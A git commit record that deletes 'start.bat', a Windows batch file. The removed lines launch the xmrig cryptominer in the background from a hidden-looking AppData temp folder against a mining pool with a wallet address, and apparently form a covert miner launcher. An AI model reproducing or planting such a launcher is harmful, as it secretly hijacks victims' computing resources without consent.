81cb4b71a86cac4d358b2b9523d78881d760800c
Johan - Bonaparte <ali.slm.1331@gmail.com>
2022-02-13 04:02:49 +0330

    Delete start.bat

--- start.bat
+++
@@ -1,5 +0,0 @@
-@echo off
-cd %appdata%\Microsoft\Windows\temp
-xmrig.exe --donate-level 1 -o pool.hashvault.pro:80 -u 88yT7x4S3Txcs62YLQrVNFdPVxgFsLTyNUBwJVgoLAMpJyfzCmMrqMDaC37WTuoUsWjZLC1jGn5LF9PVemiReGVMAi2Hg4x -p fartland -B
-
-
